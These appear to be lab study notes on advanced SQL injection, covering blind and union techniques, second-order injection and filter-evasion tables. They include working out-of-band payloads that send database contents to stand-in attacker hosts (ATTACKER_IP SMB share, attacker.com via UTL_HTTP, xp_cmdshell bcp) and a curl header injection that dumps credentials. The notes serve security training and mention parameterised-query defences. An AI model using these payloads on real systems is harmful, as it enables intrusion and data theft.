# Advanced SQL Injection

## Overview

SQL injection is one of the most critical and persistent web application vulnerabilities. Advanced SQL injection covers sophisticated techniques beyond basic authentication bypass — including in-band, blind, and out-of-band methods, filter evasion, second-order injection, HTTP header injection, and out-of-band exfiltration. This room provides a comprehensive understanding of these vectors and the tools and mitigations used against them.

---

## Topics Covered

- SQL injection technique categories: in-band, inferential, out-of-band
- Second-order (stored) SQL injection
- Filter evasion: character encoding, no-quote techniques, space bypass
- Out-of-band SQL injection and exfiltration techniques
- HTTP header injection
- Tools: SQLMap, SQLNinja, BBQSQL
- Best practices for developers and pentesters

---

## Key Concepts

### SQL Injection Technique Categories

#### In-Band SQL Injection

The attacker uses the same communication channel for both injection and data retrieval. Two primary subtypes:

| Subtype | Description | Example |
|---------|-------------|---------|
| **Error-Based** | Manipulates the query to produce error messages that reveal database structure | `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))` — version returned in error |
| **Union-Based** | Uses `UNION ALL` to combine the original query's results with results from another table | `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin` |

**Characteristics:** Easy to exploit and detect. Noisy — can be logged and monitored.

#### Inferential (Blind) SQL Injection

No data is returned directly. The attacker infers information from the application's behaviour.

| Subtype | Description | Example |
|---------|-------------|---------|
| **Boolean-Based** | Sends true/false conditions and observes different application responses | `id=1 AND 1=1` (true, page loads) vs `id=1 AND 1=2` (false, different response) |
| **Time-Based** | Sends a query that delays the server response if the condition is true | `id=1; IF (1=1) WAITFOR DELAY '00:00:05'--` — 5-second delay confirms true |

**Characteristics:** More difficult — requires many requests. Used when error messages are suppressed.

#### Out-of-Band SQL Injection

The attacker uses a separate channel (HTTP, DNS, SMB) to receive query results. Used when direct responses are blocked or unstable.

**Characteristics:** Stealthy, evades most IDS/WAF monitoring. Requires the database server to make outbound connections.

---

### Second-Order (Stored) SQL Injection

Second-order SQL injection is more insidious than first-order. The malicious payload is stored in the database during one operation and executed later when that stored data is retrieved and used in a subsequent SQL query.

**Why it is harder to detect:**
- The injection does not cause an error at the point of input
- Standard input validation passes because the payload appears benign at first
- The attack fires during a later operation (e.g. a profile update, search, or display function)

**Example flow:**
1. Attacker registers a username: `admin'--`
2. Username is safely stored (properly escaped at insert)
3. Later, the application retrieves the username and unsafely embeds it into a new query
4. The `'--` in the username breaks the new query and exploits it

**Impact:** Bypasses front-end defences that only validate at the point of initial input.

---

### Filter Evasion Techniques

Modern web applications implement filters to block common SQL injection payloads. These techniques bypass those filters.

#### Character Encoding

| Method | Description | Example |
|--------|-------------|---------|
| URL Encoding | Represents characters as `%XX` hex sequences | `' OR 1=1--` → `%27%20OR%201%3D1--` |
| Hexadecimal Encoding | Represents string values as hex literals | `SELECT * FROM users WHERE name = 0x61646d696e` (hex for `admin`) |
| Unicode Encoding | Represents characters as Unicode escape sequences | `admin` → `\u0061\u0064\u006d\u0069\u006e` |

**How it works:** The filter sees encoded input and does not recognise it as malicious. The database decodes it and executes the intended SQL.

#### No-Quote SQL Injection

Used when single or double quotes are filtered or escaped.

| Technique | Description |
|-----------|-------------|
| Numerical values | Use `OR 1=1` without quotes where the context is numeric |
| SQL comments | Use `--` to comment out the rest of a query: `admin--` |
| CONCAT() | Build strings without quotes: `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` = `admin` |

#### Space Bypass

When spaces are filtered:

| Technique | Example |
|-----------|---------|
| Inline comments | `SELECT/**/username/**/FROM/**/users` |
| Tab character | `SELECT\t*\tFROM\tusers` |
| URL-encoded whitespace | `%09` (tab), `%0A` (newline), `%0D` (carriage return), `%A0` (non-breaking space) |

#### General Filter Bypass Reference

| Scenario | Technique | Example |
|----------|-----------|---------|
| `SELECT` is banned | Mixed case / inline comments | `SElEcT` or `SE/**/LECT` |
| Spaces banned | Alt whitespace or comments | `SELECT%0A*%0AFROM%0Ausers` |
| `AND`, `OR` banned | Alt operators | `&&` for AND, `\|\|` for OR, `\|\|1=1` |
| `UNION`, `SELECT` banned | Hex / Unicode encoding | `CHAR(0x55,0x4E,0x49,0x4F,0x4E)` |
| Multiple keywords banned | String functions / obfuscation | `CONCAT('a','d','m','i','n')` |

> Note: There is no single guaranteed bypass. SQL injection testing requires patience and adaptation to the specific environment and filter set.

---

### Out-of-Band SQL Injection

#### Why Use OOB

- Server responses are sanitised or restricted by WAF/IDS
- Direct responses are unavailable (blind context with no timing or boolean signal)
- Network environments with limited direct connectivity

#### Database-Specific Techniques

**MySQL / MariaDB:**
```sql
SELECT sensitive_data FROM users INTO OUTFILE '\\\\ATTACKER_IP\\logs\\out.txt';
```
Writes query results to an SMB share. Requires `secure_file_priv` to be empty or set to an accessible path.

**Microsoft SQL Server (MSSQL):**
```sql
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```
Uses `xp_cmdshell` to execute OS commands and write results to a network share.

**Oracle:**
```sql
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfil?data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```
Uses the `UTL_HTTP` package to send data in an HTTP request to an attacker-controlled server.

#### SMB Exfiltration Lab Setup (Attacker Side)

```bash
cd /opt/impacket/examples
python3.9 smbserver.py -smb2support -comment "Logs" -debug logs /tmp
```

**Payload injected into vulnerable parameter:**
```
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKER_IP\\logs\\out.txt'; --
```

**Payload breakdown:**
- `1'` — closes the original string in the query
- `;` — ends the first SQL statement
- `SELECT @@version INTO OUTFILE '...'` — writes database version to the SMB share
- `--` — comments out the remainder of the original query

**Important consideration:** The MySQL `secure_file_priv` variable restricts file write operations to a specific directory. If set, writes outside that directory will fail — attackers must probe different paths.

---

### HTTP Header Injection

HTTP headers (User-Agent, Referer, X-Forwarded-For) are sometimes logged or used in SQL queries without sanitisation. An attacker who can control these headers can inject SQL.

**Malicious User-Agent:**
```
User-Agent: ' UNION SELECT username, password FROM user; #
```

**curl command to inject:**
```bash
curl -H "User-Agent: ' UNION SELECT username, password FROM user; #" http://TARGET/httpagent/
```

The `#` comments out the rest of the query. The `UNION SELECT` appends the users table credentials to the logged User-Agent entry, which is then returned when the logs page is viewed.

---

## Important Terminology

| Term | Meaning |
|------|---------|
| In-band SQLi | Attack and data retrieval use the same channel |
| Blind SQLi | No direct data returned — inferred from behaviour or timing |
| Out-of-band SQLi | Separate channel (DNS, HTTP, SMB) used to receive exfiltrated data |
| Second-order SQLi | Payload stored harmlessly, executed in a later operation |
| UNION-based | Uses SQL UNION to append results from another table |
| Time-based blind | Delays response to confirm true/false conditions |
| Filter evasion | Techniques to bypass input validation and WAF rules |
| secure_file_priv | MySQL variable restricting which directory files can be written to |
| xp_cmdshell | MSSQL stored procedure enabling OS command execution |

---

## Tools

| Tool | Description |
|------|-------------|
| **SQLMap** | Open-source automated SQLi detection and exploitation. Supports all major databases and injection types |
| **SQLNinja** | Specialised for MSSQL backends — fingerprinting, data extraction, OS command execution |
| **jSQL Injection** | Java-based SQLi testing tool for various injection types |
| **BBQSQL** | Python framework for automating blind SQL injection exploitation |

---

## Workflow / Process

```
Identify injection point (URL param, POST field, HTTP header, cookie)
        |
        v
Confirm injection: submit ' or " and observe error or behaviour change
        |
        v
Determine injection type:
  Error messages visible      → Error-based / Union-based
  Behaviour changes (bool)    → Boolean-based blind
  Response timing changes     → Time-based blind
  No visible feedback         → Out-of-band
        |
        v
Enumerate database: version, database name, tables, columns
        |
        v
Extract target data
        |
        v
If filters present: apply evasion (encoding, comment substitution, case mixing)
        |
        v
Document findings and evidence
```

---

## Real-World Relevance

- SQL injection consistently appears in the OWASP Top 10 and is among the most commonly confirmed vulnerabilities in web application assessments
- Second-order SQL injection is frequently missed by automated scanners — it requires understanding the full data flow of the application
- OOB techniques using DNS exfiltration are used by sophisticated threat actors to bypass egress filtering that blocks HTTP/SMB
- HTTP header injection is often overlooked because logging code receives less security scrutiny than authentication or search code
- `xp_cmdshell` in MSSQL has been used in real-world ransomware attacks to execute OS commands after initial SQLi access

---

## Key Learnings

- SQL injection has three primary categories: in-band (error/union), inferential/blind (boolean/time), and out-of-band (DNS/HTTP/SMB)
- Second-order injection stores the payload safely and fires it later — bypasses point-of-entry validation
- Filter evasion relies on encoding, spacing alternatives, case mixing, comment insertion, and string functions
- OOB injection uses `INTO OUTFILE`, `xp_cmdshell`, or `UTL_HTTP` to send data to attacker-controlled servers
- HTTP headers are valid injection points — always sanitise inputs from any user-controlled source
- Parameterised queries and prepared statements are the primary defence — they structurally prevent all SQL injection regardless of input encoding

---

## Additional Notes

- SQLMap's `--tamper` scripts provide built-in evasion for common WAF rules
- `secure_file_priv` being empty is a misconfiguration — production MySQL should always have it set
- Always confirm scope and authorisation before running SQLMap against any target
- The hit-and-trial nature of filter bypass in real environments requires methodical documentation of what was tried and what worked

---

## Conclusion

Advanced SQL injection extends far beyond simple authentication bypass. Understanding the full taxonomy — in-band, blind, out-of-band, second-order, and header injection — combined with filter evasion techniques gives penetration testers the breadth to find and demonstrate SQL injection impact across complex, hardened environments. The universal defence remains parameterised queries: they make SQL injection structurally impossible regardless of what encoding or evasion the attacker applies.
